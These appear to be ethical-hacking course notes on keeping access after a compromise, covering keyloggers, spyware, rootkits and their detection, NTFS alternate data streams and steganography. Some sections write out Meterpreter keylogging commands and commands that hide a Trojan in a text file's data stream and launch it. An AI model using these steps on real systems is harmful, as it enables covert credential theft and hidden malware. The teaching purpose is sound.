# ♻️ Maintaining Access
Maintaining access means attackers, after breaking into a system, secretly install tools like keyloggers or spyware to stay hidden and keep control, so they can continue stealing data or attack other systems later.

----
## Executing Applications
Executing Applications is the stage where attackers, after gaining admin rights, run malicious programs on the victim's system to steal data, control the system, or install backdoors—often done locally or remotely to fully “own” the machine.

The malicious programs attackers execute on target systems can be:
- **Backdoors:** Backdoors are hidden ways to access a system without permission. Hackers use them to bypass security, steal data, or control the system later.
  
- **Crackers:** Crackers are tools used to break passwords, software licenses, or encryption. They're often used to unlock paid software illegally or get into protected systems.

- **Keyloggers:** Keyloggers record every key you press on your keyboard. Hackers use them to steal login details, credit card numbers, and other sensitive information.
  
- **Spyware:** Spyware secretly monitors what you do on your computer. It can take screenshots, track browsing activity, or send data to hackers. Attackers often install backdoors along with spyware to keep accessing the victim’s system later.

---
### Remote Code Execution Techniques 
Remote Code Execution (RCE) is a hacking technique where an attacker runs malicious code on another computer or server over a network. This usually happens after the attacker has already found a way into the system and wants to take control of other connected machines.

1. **Exploitation for Client Execution** - Attackers exploit software vulnerabilities to run code and take control of remote systems. Different types of exploitations for client execution are as follows:
   
      * **Web Browser Exploits** - Hackers use fake or malicious websites (like spear-phishing links). When a user visits the page, the browser gets compromised without the user even clicking anything.
      * **Office Application Exploits** - Hackers send emails with infected Word, Excel, or PDF files. The attack only works when the user opens the malicious file.
      * **Third-Party App Exploits** - Vulnerabilities in popular apps like Adobe Reader or Flash can be used to break into a system when the app is used or opened.

2. **Service Execution** - Attackers create or modify Windows services to run harmful code. This helps them stay hidden and keep control over the system.

3. **Windows Management Instrumentation (WMI)** - WMI is a Windows tool used to manage systems. Hackers use it to:

      * Remotely control systems
      * Collect data from systems
      * Run malicious code
      * Move from one computer to another inside a network

They often use ports like **135**, **5985**, and **5986** to connect remotely.

4. **Windows Remote Management (WinRM)** - WinRM is used by admins to manage systems remotely. Attackers abuse it to:

      * Run malicious files on remote systems
      * Change system settings or services
      * Move across systems in a network (lateral movement)

### Tools for Executing Applications 
Tools used for executing applications remotely help attackers perform various malicious activities on the target systems. After gaining administrative privileges, attackers use these tools to install, execute, delete, and/or modify the restricted resources on the victim machine.

- **Dameware Remote Support** [https://www.solarwinds.com]
- **Ninja** [https://github.com/ninja-build/ninja]
- **Pupy** [https://github.com/n1nj4sec/pupy]
- **PDQ Deploy** [https://www.pdq.com]
- **ManageEngine Endpoint Central** [https://www.manageengine.com]
- **PsExec** [https://learn.microsoft.com/en-us/sysinternals/downloads/psexec]

----
### 🔑Keylogger
Keystroke loggers (or keyloggers) are tools that secretly record everything a user types on a keyboard. They help attackers collect personal data like passwords, messages, emails, and more. These can be either hardware-based or software-based, depending on how they are used.

![keylogger](https://github.com/user-attachments/assets/a09b7440-717f-4efe-86d1-6cd64a760c20)

### Types of Keystroke Loggers
![Keyloggertypes](https://github.com/user-attachments/assets/226ff09f-d358-4469-b03d-27b8fee73edd)

There are two types of keystroke loggers: hardware key loggers and software key loggers. Both types help attackers to record all keystrokes entered on the target system. 

1. **Hardware Keystroke Loggers:** These are physical devices placed between the keyboard and the computer. They don’t need any software to work and are hard to detect through antivirus tools.

   * **PC/BIOS Embedded** - Hackers change the computer’s BIOS (startup software) to record keyboard inputs. It needs admin-level access and is hard to detect.
   
   * **Keylogger Keyboard:** - A keyboard with a special circuit built inside that stores all keystrokes. It saves data in its own memory, and it doesn't rely on the operating system, so software can't detect it.
  
   * **External Keylogger:** - A small device plugged between the keyboard and computer port. It captures every key press and stores it. It's easy to install but can be seen physically. There are four types of external keyloggers:
     
     - **PS/2 and USB Keylogger:** A plug-and-play device that saves all typed information without needing software or drivers.
       
     - **Acoustic/CAM Keylogger:** Uses sound or cameras to track keystrokes. For example, sound from key presses is turned into data.
       
     - **Bluetooth Keylogger:** Installed once physically, then it sends live keystroke data wirelessly via Bluetooth.
       
     - **Wi-Fi Keylogger:** Works like other keyloggers but uses Wi-Fi to send stolen data to attackers over the internet.

2. **Software Keystroke Loggers:** These are programs installed on the victim’s system through emails or the internet. They store keystrokes in hidden files and send them to the attacker, often through email. They can collect more data than hardware loggers and are harder to spot without proper tools.

    * **Application Keylogger** - Tracks everything typed in apps like chat, email, and web browsers. It works silently in the background.
      
    * **Kernel/Rootkit/Device Driver Keylogger** This is an advanced and hidden type that works deep inside the system (kernel level).
      
      * **Kernel Keylogger:** Hard to create and detect. It works as a fake keyboard driver and captures all typed keys.
      
      * **Rootkit-Based Keylogger:** A hidden Windows driver that records keystrokes. It avoids detection even by antivirus.
      
      * **Device Driver Keylogger:** Replaces the normal keyboard driver with a fake one that logs keystrokes secretly and sends them to the attacker.

   * **Hypervisor-Based Keylogger** - This works under the operating system, in a fake virtual machine (malware hypervisor). It quietly controls the system and records keystrokes without being noticed.
   
   * **Form-Grabbing Keylogger** - Instead of just logging keystrokes, this one captures what you type in online forms (like login forms), even if the site uses HTTPS (secure connection). It records the data when you press the submit button.
   
   * **JavaScript-Based Keylogger** - Attackers add harmful JavaScript code to websites (using tricks like XSS or browser hijacking). The script watches and records keystrokes using browser events like onKeyDown() and onKeyUp().
   
   * **Memory-Injection Keylogger** - This type of keylogger modifies the computer’s memory to hook into the browser or system. It records keystrokes and can even bypass Windows security (UAC) to stay hidden.

----
### Remote Keylogger Attack Using Metasploit
In a remote keylogger attack using Metasploit, hackers first gain access to the victim’s computer. If they can’t directly view protected files or folders, they use Metasploit to install a keylogger on the target system. This keylogger then records all keyboard activity—like passwords typed—and sends it back to the attacker, helping them steal even the most securely stored data.

### Establishing a Keylogger Using Metasploit 
#### 🔐 **Short Explanation:**
Once an attacker gets access to a Windows machine using Metasploit (Meterpreter session), they:

1. List running processes.
2. Migrate to a stable process like `explorer.exe`.
3. Start keylogging with `keyscan_start`.
4. Collect keystrokes using `keyscan_dump`.
5. Stop the keylogger with `keyscan_stop`.

### 🧑‍💻 **Commands with Description:**

```bash
# Step 1: List all running processes
ps              # Shows process list with PIDs

# Step 2: Check your current process ID
getpid          # Shows current PID

# Step 3: Migrate to a stable process like explorer.exe (replace <PID> with actual explorer.exe PID)
migrate <PID>   # Migrates session to another process to avoid detection

# Step 4: Start the keylogger
keyscan_start   # Begins recording keystrokes

# Step 5: Dump captured keystrokes
keyscan_dump    # Displays recorded keystrokes

# Step 6: Stop the keylogger
keyscan_stop    # Stops recording keystrokes
```
> ✅ **Note:** Attackers can also use `post/windows/capture/lockout_keylogger` module to automate this.

----
### Hardware Keyloggers
Hardware keyloggers come from numerous manufacturers and vendors, Some hardware keyloggers are listed as follows:
- **KeyGrabber** [https://www.keydemon.com]
- **KeyGrabber USB** [https://www.keelog.com]
- **KeyCarbon** [https://www.keykatcher.com]
- **Keyboard logger** [https://www.detective-store.com]
- **KeyGhost** [https://www.keyghost.com]
- **KEYKatcher** [https://keykatcher.com]

----
### Keyloggers for Windows (Software Keyloggers)
Some of the keyloggers for Windows are listed as follows:
- **Spyrix Personal Monitor** [https://www.spyrix.com]
- ▪ **REFOG Personal Monitor** [https://www.refog.com]
- **All In One Keylogger** [https://www.relytec.com]
- **Revealer Keylogger Pro** [https://www.logixoft.com]
- **NetBull** [https://www.netbull.com]
- **Spytector** [https://www.spytector.com]

----
### Keyloggers for macOS 
The following keystroke loggers are specifically used on macOS:
- **Hoverwatch** [https://www.refog.com]
- **Spyrix Keylogger for Mac** [https://www.spyrix.com]
- **CleverControl** [https://clevercontrol.com]
- **FlexiSPY** [https://www.flexispy.com]
- **KidLogger** [https://kidlogger.net]
- **Perfect Keylogger for Mac** [https://www.blazingtools.com]

----
### 👁️‍🗨️Spyware
**What is Spyware?**
Spyware is a hidden software that secretly monitors and records everything a user does on their computer—like keystrokes, emails, websites visited, and passwords—and sends that data to an attacker over the internet. It often comes hidden in free software and is hard to detect because it hides itself from security tools.

### Spyware Propagation
**Spyware propagation** means how spyware spreads or installs itself on a system **without the user's knowledge**. It often hides in free software (piggybacking), uses **drive-by downloads** when users click on infected websites, or pretends to be helpful tools like fake anti-spyware. Just by browsing or downloading something, a computer can get infected.

### Spyware Tools
- **Spytech SpyAgent** [https://www.spytech-web.com]
- **Spyrix Personal Monitor** [https://www.spyrix.com]

### Types of Spyware 
Spyware is a hidden program that secretly collects your personal information, changes your browser settings, shows unwanted ads, and tracks your online activity. While some spyware may seem harmless, many types are used by attackers to steal data without your permission or knowledge.

1. **Desktop Spyware** – Tracks everything done on a computer and secretly sends it to others online. The following is the list of desktop and child-monitoring spyware: 
      - **CurrentWare** [https://www.currentware.com]
      - **FlexiSPY** [https://www.flexispy.com]
      - **NetVizor** [https://www.netvizor.net]
      - **SoftActivity Monitor** [https://www.softactivity.com]
      - **SoftActivity TS Monitor** [https://www.softactivity.com]

2. **Email Spyware** – Records all sent and received emails, even messages, and secretly sends copies to someone else.

3. **Internet Spyware** – Logs websites visited and online activities without being noticed, and can block certain sites.

4. **Child-Monitoring Spyware** – Lets parents secretly monitor their child’s computer use, including websites, apps, and typed content.

5. **Screen-Capturing Spyware** – Takes secret screenshots of the computer screen and records what users do.

6. **USB Spyware** – Hidden software that auto-installs from USB and monitors USB data secretly. The following is the list of USB spyware:
      - **USB Monitor** [https://www.hhdsoftware.com]
      - **USBDeview** [https://www.nirsoft.net]
      - **Advanced USB Port Monitor** [https://www.aggsoft.com]
      - **Free USB Analyzer** [https://freeusbanalyzer.com]

8. **Audio Spyware** – Records sounds from the computer like voice chats or meetings silently in the background. The following is the list of audio spyware:
      - **TheOneSpy** [https://www.theonespy.com]
      - **Snooper** [https://www.snooper.se]

10. **Video Spyware** – Secretly records webcam and video chats, and can stream or store the footage for later. The following is the list of video spyware:
      - **iSpy** [https://www.ispyconnect.com]
      - **Perfect IP Camera Viewer** [https://www.perfect-surveillance.com]
      - **Optiview VMS** [https://optiviewusa.com]
      - **Eyeline Video Surveillance Software** [https://www.nchsoftware.com]

12. **Print Spyware** – Monitors and logs all printing activity to track what documents are printed and by whom.

13. **Telephone/Cellphone Spyware** – Spies on phone calls, messages, and app use, and sends the data to the attacker. The following is the list of telephone/cellphone spyware:
      - **mSpy** [https://www.mspy.com]
      - **XNSPY** [https://xnspy.com]
      - **iKeyMonitor** [https://ikeymonitor.com]
      - **ONESPY** [https://onespy.in]
      - **Highster Mobile** [https://www.highstermobiles.com]

15. **GPS Spyware** – Tracks a person or device’s live location and sends it to the attacker using GPS. The following is the list of GPS spyware:
      - **SPYERA** [https://spyera.com]
      - **Snoopza** [https://snoopza.com]
      - **MobiStealth** [https://www.mobistealth.com]
      - **FlexiSPY** [https://www.flexispy.com]
      - **Mobile Tracker Free** [https://mobile-tracker-free.com]

----
### Anti-Keyloggers
An anti-keylogger is a security tool that finds and removes keylogger programs from your computer. It protects your keystrokes from being recorded and keeps your personal data safe. It works by scanning for known keylogger files or blocking any software trying to access the keyboard secretly. Some even use virtual keyboards to stop keylogging completely. Some examples of anti-keyloggers are listed as follows:

- **Zemana AntiLogger** [https://zemana.com]
- **GuardedID** [https://www.guardedid.com]
- **KeyScrambler** [https://www.qfxsoftware.com]
- **Oxynger KeyShield** [https://www.oxynger.com]
- **Ghostpress** [https://schiffer.tech]
- **SpyShelter** [https://www.spyshelter.com]

---
### Anti-Spyware
Anti-spyware is a security tool that detects and removes spyware like malware, keyloggers, and Trojans from your system. It regularly scans your computer and gives real-time protection to keep it safe from harmful software. Some examples of anti-spyware programs are listed as follows:

- **SUPERAntiSpyware** [https://www.superantispyware.com]
- **Kaspersky Total Security 20** [https://support.kaspersky.com]
- **SecureAnywhere Internet Security Complete** [https://www.webroot.com]
- **Avast One** [https://www.avast.com]
- **MacScan 3** [https://www.securemac.com]
- **Malwarebytes** [https://www.malwarebytes.com]

---
## Hiding Files 
After hacking a system, attackers hide their malicious files using tricks like rootkits, NTFS streams, or steganography. This helps them avoid detection by antivirus software and keep control of the system secretly for future access.

---
### 🦠Rootkits 
A rootkit is a dangerous type of malware that secretly gives attackers full control (root access) over a system. It hides itself deep in the operating system, making it hard to detect. Once installed, it can let hackers delete files, install other malware, spy on users, or cover up their tracks by changing system files and processes. It often uses OS vulnerabilities and can even hide or change file attributes to stay invisible.

### Types of Rootkits
Rootkits employ a range of techniques to gain control of a system. The type of rootkit influences the choice of attack vectors. There are six types of rootkits available:

1. **Hypervisor-Level Rootkit**: Runs under the operating system using virtualization to secretly control everything the system does.

2. **Hardware/Firmware Rootkit**: Hides in hardware like BIOS or hard drives, making it hard to detect and remove.

3. **Kernel-Level Rootkit**: Hides deep inside the operating system with full control, making it powerful and dangerous.

4. **Boot-Loader Rootkit**: Loads before the OS starts by modifying the boot process, allowing it to bypass security early.

5. **Application-Level Rootkit**: Replaces or modifies software apps to spy or control without being noticed.

6. **Library-Level Rootkit**: Alters system files or libraries to hide malicious activity from users and tools.

7. **Memory Rootkit**: Stays only in RAM, leaving no trace on disk, so it's hard to detect and vanishes on reboot.

### How a Rootkit Works
A rootkit works by secretly changing how your system functions so it can stay hidden. It does this by redirecting system calls to its own code (called system hooking) or by modifying core system files like `kernel32.dll` or `ntdll.dll` to run its code first (inline hooking). Some advanced rootkits use a technique called Direct Kernel Object Manipulation (DKOM) to directly change hidden parts of the system's memory. This allows them to hide processes, open backdoors, change user privileges, and fool system tools like the Windows event viewer, all without being detected.

![image](https://github.com/user-attachments/assets/72b44b80-468f-441b-a964-ee5037500a43)

### Popular Rootkits 
The following are some of the most popular rootkits:
- **FudModule Rootkit** [https://decoded.avast.io]
- **Fire Chili Rootkit** [https://www.fortinet.com]
- **CopperStealer**
- **Syslogk**
- **Stealthy Universal Rootkit**
- **Reptile rootkit**
- **CosmicStrand**

### Detecting Rootkits 
Detecting rootkits is tricky because they hide themselves deeply in the system. To find them, security tools use different methods like checking for known rootkit patterns (signature-based), spotting suspicious behavior (heuristic-based), comparing system files with clean versions (integrity-based), checking what the system shows vs. what’s really running (cross-view), and analyzing how programs run in real-time (runtime path profiling). These techniques help uncover rootkits even when they try to stay hidden.

To stop rootkits, it’s important to detect unusual activity early—like strange network traffic or system changes—since rootkits need admin access. Use log analysis and file integrity tools like `MD5sum` to catch changes in system files. For strong protection, regularly back up important data and reinstall your system from a trusted source if infection is suspected.


1. **Integrity-Based Detection** checks for changes in files by comparing with a clean snapshot.
2. **Signature-Based Detection** looks for known malicious patterns like a fingerprint.
3. **Heuristic/Behavior-Based Detection** spots abnormal system behavior.
4. **Runtime Execution Path Profiling** watches for strange code added to system routines.
5. **Cross-View Detection** compares real system data with what the OS reports to catch hidden changes.
6. **Alternative Trusted Medium** boots the system from an external drive to scan for rootkits safely.
7. **Memory Dump Analysis** captures and analyzes RAM to find active rootkits.
8. **Virtualization-Based Analysis** uses a hypervisor to monitor the system from outside and detect hidden threats.

### Steps for Detecting Rootkits
Detecting rootkits can be tough because attackers constantly create new ways to hide them from security tools. While there are many tools available to find rootkits, they don’t always work against advanced or updated ones. That’s why manual detection—though time-consuming and requiring skill—is often more reliable, as it helps spot hidden rootkits that automated tools might miss.

Manually examine the filesystem and registry of the system to detect rootkits.

#### 1. Steps to detect rootkits by examining the filesystem are as follows. 
```powershell
# Step-1: Inside the potentially infected system
# ---------------------------------------------
# List all hidden files in all folders and save output
C:\> dir /s /b /ah > infected_hidden.txt

# List all non-hidden files in all folders and save output
C:\> dir /s /b /a-h > infected_visible.txt


# Step-2: Boot from a clean USB (safe system)
# ---------------------------------------------
# Access the same drive (e.g., C:\ of infected system mounted as D:\ here)

# List hidden files from clean environment and save output
D:\> dir /s /b /ah > clean_hidden.txt

# List non-hidden files from clean environment and save output
D:\> dir /s /b /a-h > clean_visible.txt


# Step-3: Compare both results using WinMerge (GUI Tool)
# -------------------------------------------------------
# Open WinMerge → Compare:
#    "infected_hidden.txt" vs "clean_hidden.txt"
#    "infected_visible.txt" vs "clean_visible.txt"

# This will show files that are hidden on the infected system but visible from the outside.
# These are possible rootkit or ghostware files.
```

#### 2. Steps to detect rootkits by examining the registry are as follows.
```powershell
# Step 1: On infected system, open registry editor
regedit.exe
# -> This opens Windows Registry Editor.

# Step 2: Export important registry hives
# In regedit, export the following as .txt:
# HKEY_LOCAL_MACHINE\SOFTWARE
# HKEY_LOCAL_MACHINE\SYSTEM
# -> These contain key system and software settings.

# Step 3: Reboot system using a clean OS (e.g., from USB like WinPE)
# Boot from USB to avoid running the infected OS.

# Step 4: Again, open Registry Editor from clean OS
regedit.exe

# Step 5: Create a temporary key to mount the old registry
# In Registry Editor, select HKEY_LOCAL_MACHINE → File → Load Hive
# Navigate to:
# c:\windows\system32\config\software
# c:\windows\system32\config\system
# Load them into:
# HKEY_LOCAL_MACHINE\Temp

# Step 6: Export these loaded hives as .txt files
# -> This gives you clean-view copies of the suspect registry in text format.

# Step 7: Use a comparison tool (e.g., WinMerge) from the USB
WinMerge.exe
# -> Compare the two sets of exported registry files (infected vs clean).
# If malware/rootkits are hiding, the infected system's regedit might not show all entries,
# but WinPE's regedit + WinMerge will catch them.
```
> Note: There can be some false positives. In addition, this does not detect stealth software that hides in BIOS, video card EEPROM, bad disk sectors, alternate data streams (ADSs), etc.

### Anti-Rootkits 
Anti-rootkits are special tools used to detect and remove hidden malware like rootkits, viruses, and Trojans. You can download or buy them online to protect your system by scanning and cleaning out deeply hidden threats. A few more important anti-rootkits are listed as follows:
- **GMER** [http://www.gmer.net]
- **Stinger** [https://www.trellix.com]
- **Avast One** [https://www.avast.com]
- **TDSSKiller** [https://usa.kaspersky.com]
- **Malwarebytes Anti-Rootkit** [https://www.malwarebytes.com]
- **AVG Rootkit Scanner** [https://www.avg.com]

---
### 💾NTFS Data Stream
NTFS filesystems use two data streams to store a file—one for file permissions and one for the actual content. NTFS files can hold extra hidden data called **Alternate Data Streams (ADS)**, which are attached to a file without changing its size or how it looks. These streams store extra info like file attributes or even hidden malicious code. Attackers use ADS to hide tools or malware inside regular-looking files, making them very hard to detect with normal methods like Windows Explorer or Command Prompt. Only advanced tools can find these hidden streams.

### How to Create NTFS Streams
```powershell
# Step 1: Create a hidden stream named 'lion.txt' inside 'myfile.txt'
c:\> notepad myfile.txt:lion.txt
# → Notepad opens. Type some data, then save and close. This creates the ADS.

# Step 2: Create another hidden stream named 'tiger.txt' in the same file
c:\> notepad myfile.txt:tiger.txt
# → Again, type some data, then save and close. This adds another ADS.

# Step 3: Check the visible file size of myfile.txt
c:\> dir myfile.txt
# → File size appears as 0 bytes because the data is in ADS, not the main file.

# Step 4: View or edit hidden stream data
c:\> notepad myfile.txt:lion.txt
# → Opens the hidden 'lion.txt' stream

c:\> notepad myfile.txt:tiger.txt
# → Opens the hidden 'tiger.txt' stream
```
> Note: Notepad is a stream-compliant application. You should not use alternate streams to store critical information.

### NTFS Stream Manipulation 
You can manipulate NTFS streams to hide a malicious file in other files, such as text files, by doing the following:
```powershell
# Step 1: Hide Trojan.exe inside Readme.txt using ADS
C:\> type C:\Trojan.exe > C:\Readme.txt:Trojan.exe
# → This command hides the contents of Trojan.exe inside Readme.txt as a hidden stream.

# Step 2: Create a shortcut (link) to the hidden Trojan.exe
C:\> mklink backdoor.exe Readme.txt:Trojan.exe
# → This creates a backdoor.exe link that points to the hidden Trojan.exe stream.

# Step 3: Run the hidden Trojan using the shortcut
C:\> backdoor.exe
# → This executes the hidden Trojan stored inside Readme.txt.

# (Optional) Step 4: View a hidden text stream using Notepad
C:\> notepad sample.txt:secret.txt
# → Opens a hidden text stream named secret.txt behind sample.txt using Notepad.
```

### NTFS Stream Detectors
- **Stream Armor** [https://securityxploded.com]
- **Stream Detector** [https://www.novirusthanks.org]
- **GMER** [http://www.gmer.net]
- **ADS Scanner** [https://www.pointstone.com]
- **Streams** [https://learn.microsoft.com]
- **AlternateStreamView** [https://www.nirsoft.net]

----
### 🖼️🔐Steganography
**Steganography (Simple Explanation):**
Steganography is the technique of secretly hiding data inside files like images, audio, video, or text so no one knows it's there. Unlike encryption, it hides the message itself. For example, attackers can hide malware like keyloggers in images, making them hard to detect. It's often used when encryption isn't enough or possible, making it a stealthy way to share hidden information.

### Classification of Steganography 
Based on its technique, steganography can be classified into two areas: technical and linguistic. In technical steganography, a message is hidden using scientific methods, whereas in linguistic steganography, it is hidden in a carrier, which is the medium used to communicate or transfer messages or files. This medium comprises of the hidden message, carrier, and steganography key. 

**The following diagram depicts the classification of steganography.** 

![image](https://github.com/user-attachments/assets/17e77181-fe2b-4e12-9724-5d6434c80f64)

### 1. Technical Steganography
It hides secret messages using physical or digital methods so others can’t detect them.
* **Invisible Ink:** Uses colorless liquids (like milk or onion juice) to write messages that appear only with heat or light.

* **Microdots:** Shrinks an entire message or image into a tiny dot (1mm), often invisible to the eye, used to avoid detection.

* **Computer-Based Methods:** Hides data in digital files like images, videos, audio, or network traffic. Some computer-based steganography as follows:

  - **Substitution:** Replaces tiny bits (like pixels) in media with secret data.
    
  - **Transform Domain:** Hides data in complex parts of media using image processing like compression or cropping.
  
  - **Spread Spectrum:** Hides data by spreading it across a wide range of frequencies, making it hard to detect.
  
  - **Statistical:** Alters statistics of a file when embedding a message so changes are detectable only if you know what to look for.
  
  - **Distortion:** Modifies the original file slightly to carry the message; the receiver compares with the original to extract it.
  
  - **Cover Generation:** Creates a new digital file designed to carry a hidden message from the start.

#### 2. Linguistic Steganography
Linguistic steganography hides secret messages inside text or symbols in a way that looks normal.

* **Semagrams**:
  Hide info using signs or changes in appearance.

  * *Visual Semagrams*: Hidden in art, music, or symbols.
  * *Text Semagrams*: Hidden using font style, size, spacing, or handwritten flourishes.

* **Open Codes**:
  Use special writing patterns to hide messages in visible text.

  * *Jargon Codes*: Use secret language understood only by a specific group.
  * *Covered Ciphers*: Messages are hidden in plain sight, readable only with a known method.

    * *Null Ciphers*: Mix real message with junk data in a secret order.
    * *Grille Ciphers*: Use a special cut-out (grille) to write and read the hidden message.

---
### Types of Steganography based on Cover Medium
Steganography hides messages inside files so only the intended person knows they exist. It mainly involves two parts: **data hiding** and **document making**. Document making protects content from being removed and includes two key methods—**watermarking**, which proves ownership, and **fingerprinting**, which helps trace the source of data leaks.

The different types of steganography are as follows: 

* **Image Steganography**: Hides data inside image files by changing pixel values slightly.
* **Document Steganography**: Conceals info in text files by altering formatting or characters.
* **Folder Steganography**: Hides files inside folders using software or file attributes.
* **Video Steganography**: Embeds data into video frames or audio tracks of a video.
* **Audio Steganography**: Hides info in sound files by changing frequencies or noise levels.
* **Whitespace Steganography**: Uses spaces, tabs, and line breaks to store hidden data in text.
* **Web Steganography**: Hides info in HTML code, metadata, or website scripts.
* **Spam/Email Steganography**: Sends hidden data through spam or normal emails using headers or hidden content.
* **Natural Text Steganography**: Hides info in naturally written text using grammar tricks or synonym replacement.
* **Hidden OS Steganography**: Creates a hidden operating system inside another to store data secretly.
* **C++ Source-Code Steganography**: Embeds hidden data in source code using comments or unused variables.
* **Compressed Data Steganography**: Conceals data inside compressed files without changing size much.

Each method hides data in plain sight without raising suspicion.

---
### Whitespace Steganography
Whitespace steganography hides secret messages by adding invisible spaces or tabs at the end of text lines. Since these extra spaces can’t be seen in normal text viewers, the message stays hidden. If encryption is used, even if someone finds the hidden data, they still can't read it without the key.

- **Snow** [https://darkside.com.au ] - Snow is a tool that hides secret messages in text files by adding spaces and tabs at the end of lines. It stores data without changing the visible text. A tab marks where the hidden message starts, and the actual message is hidden using patterns of spaces and tabs. It’s a simple and clever way to hide data in plain sight.

As shown in the screenshot, attackers use the Snow tool to hide messages in a text file using the following command:
```powershell
snow [ -CQS ] [ -p passwd ] [ -l line-len ] [ -f file | -m message ] [ infile [ outfile ]]

# -C : Compress or uncompress message during hide or extract
# -Q : Quiet mode (no output, useful in scripts)
# -S : Show how much space is available to hide data in the file
# -p password : Encrypt or decrypt message with this password
# -l line-len : Set max line length (default is 80)
# -f file : Hide message from a file
# -m message : Hide message directly from a string
# infile : Input text file to hide message in
# outfile : Output file to save the new stego-text

# Example: Hide "secret.txt" inside "cover.txt", save as "output.txt", with compression and password
snow -C -p MyPassword -f secret.txt cover.txt output.txt

# Example: Extract message using password
snow -C -p MyPassword output.txt
```
---
### Image Steganography 
Image steganography hides secret messages inside image files by changing tiny, unused parts (redundant bits) that don’t affect how the image looks. This makes the changes invisible to the human eye. It works on formats like PNG, JPG, or BMP and is done in two ways: directly in pixel values (image domain) or by first converting the image into frequency form and then hiding data (transform domain).

#### Least-Significant-Bit Insertion
Least-Significant-Bit (LSB) Insertion is a simple image steganography technique where secret data is hidden in the **last bit** of each pixel’s color value (RGB). Since it only changes the tiniest part of the pixel, the image **looks the same to the human eye**, making the hidden data hard to detect.
    
#### Example: 
Hide the letter “H” (binary: 01001000) inside a 24-bit image using LSB insertion.

**Understanding the Image Pixels** - Each pixel is made of 3 color values (Red, Green, Blue), each 8 bits — so each pixel = 24 bits.

Example original pixels (simplified):
```scss
(00100111 11101001 11001000)
(00100111 11001000 11101001)
(11001000 00100111 11101001)
```
- **Step 1: Convert Secret Data to Binary** - We want to hide: `H` → ASCII binary = `01001000`
- **Step 2: Use One LSB Per Color Channel** - We’ll use the last bit (LSB) of each 8-bit color value to hide 1 bit of the secret. From the image, we are embedding like this:
```csharp
LSBs from 8 bytes: 0 1 0 0 1 0 0 0 → (equals "H")
```
- **Step 3: Replace the LSBs** - Each original byte’s last bit is replaced with one bit from the secret message:
```vbnet
Original: 00100111 → 0010011**0** (LSB changed to 0)
Original: 11101001 → 1110100**1** (LSB changed to 1)
Original: 11001000 → 1100100**0**
... and so on.
```
- **Step 4: Resulting Pixels** - After LSB modification, the image’s pixels slightly change, but it looks the same to the human eye. Now the letter H is secretly stored inside the image.
- **Step 5: Retrieving the Hidden Data** - The recipient reads the LSBs in the same order:
```php
LSBs → 01001000 → binary of “H”
```

#### Masking and Filtering
Masking and filtering hide secret data by slightly changing parts of an image, like its brightness (luminance) or transparency (opacity), in a way that’s hard for the human eye to notice. It works well on 24-bit and grayscale images, especially **JPEGs**, and is resistant to compression and cropping. The secret data is hidden in important image areas, not in random noise, so the image looks normal while still carrying hidden information.

#### Algorithms and Transformation 
In this technique, secret data is hidden inside an image during **compression** using special mathematical methods like **Fast Fourier Transform**, **Discrete Cosine Transform**, or **Wavelet Transform**. Instead of changing visible pixels (like LSB), it hides data in the **frequency domain**, making it harder to detect or remove, even after compression or editing. This method is safer than LSB because it’s more resistant to attacks and image processing. JPEG images are best for this as they naturally use Discrete Cosine Transform.

### Image Steganography Tools
- **OpenStego** [https://www.openstego.com]
- **StegOnline** [https://georgeom.net]
- **Coagula** [https://www.abc.se]
- **SSuite Picsel** [https://www.ssuitesoft.com]
- **CryptaPix** [https://www.briggsoft.com]

---
### Document Steganography 
**Document Steganography** is the method of hiding secret messages inside text documents. It works by adding invisible characters like **spaces or tabs** at the end of lines, which most people don’t notice. The document looks normal, but it secretly holds a message. A special tool or algorithm (called a **stego system**) is used to hide and later extract the hidden message from the document.

### Document Steganography Tool
Document steganography tools help in hiding files within documents, such as text or html files, using steganography methods. 
- **StegoStick** [https://sourceforge.net]
- **StegJ** [https://sourceforge.net]
- **Office XML** [https://www.irongeek.com]
- **SNOW** [https://darkside.com.au]
- **Data Stash** [https://www.skyjuicesoftware.com]

---
### Video Steganography 
**Video Steganography** is the method of hiding large secret files inside video formats like `.AVI`, `.MP4`, or `.WMV`. It uses techniques like **DCT (Discrete Cosine Transform)** to embed hidden data during video processing. Since videos are made up of many frames (images with sound), they can carry more hidden data than images. The changes made are so small that humans can't easily notice them. Just like image or audio steganography, the hidden message remains invisible, making it a secure way to secretly transfer information.

The following tools facilitate the hiding of secret information in running videos using video steganography:
- **OmniHide Pro** [https://omnihide.com]
- **RT Steganography** [https://sourceforge.net]
- **StegoStick** [https://sourceforge.net]
- **OpenPuff** [https://embeddedsw.net]
- **MSU StegoVideo** [http://www.compression.ru]

---
### Audio Steganography 
**Audio Steganography** is a technique where secret messages are hidden inside audio files like WAV or MP3 by slightly changing their binary data. These changes are so small that they can't be noticed by listening. Data is usually hidden using methods like replacing the **Least Significant Bit (LSB)** or using **inaudible high frequencies** (above 20,000 Hz). This keeps the hidden message safe without making the audio sound different.

### Here’s a **short and simple explanation** of each **Audio Steganography method**:

---

### Audio Steganography Methods

* **Echo Data Hiding**:
  Adds a tiny echo (delay) to the audio to hide data. The echo is too subtle for human ears to notice but carries secret info.

* **Spread Spectrum**:
  Hides data by spreading it over many frequencies:

  * **DSSS**: Mixes secret data across wide frequency ranges like radio signals.
  * **FHSS**: Frequently changes the frequency in a set pattern to carry hidden data.

* **LSB Coding**:
  Inserts secret data into the least significant bits of the audio’s samples. It's simple but vulnerable to audio editing or noise.

* **Tone Insertion**:
  Hides data by adding low-power tones beneath louder audio, making it hard to hear or detect.

* **Phase Encoding**:
  Changes the **phase** (wave shape) of an audio segment to represent secret bits. Very hard to detect and preserves sound quality.

These methods hide data in audio in ways that are usually undetectable by human hearing but can be decoded by special tools.

### Audio Steganography Tools
There are many tools available on the market that can help to hide secret information in an audio file. The following are some examples of audio steganography tools to hide secret information in audio files:
- **DeepSound** [https://jpinsoft.ne]
- **BitCrypt** [http://bitcrypt.moshe-szweizer.com]
- **StegoStick** [https://sourceforge.net]
- **MP3Stego** [https://www.petitcolas.net]
- **QuickCrypto** [http://www.quickcrypto.com]
- **spectrology** [https://github.com/solusipse/spectrology]

---
### Folder Steganography 
Folder steganography refers to hiding secret information in folders. Files are hidden and encrypted within a folder and are not seen by standard Windows applications, including Windows Explorer. In this process, the user moves the file physically but still stays associated to its original folder for recovery. 

### Folder Steganography Tools
- **GiliSoft File Lock Pro** [https://www.gilisoft.com]
- **Folder Lock** [https://www.newsoftwares.net]
- **Hide Folders 5** [https://fspro.net]
- **InvisibleSecrets** [https://www.east-tec.com]
- **QuickCrypto** [http://www.quickcrypto.com]

---
### Spam/Email Steganography
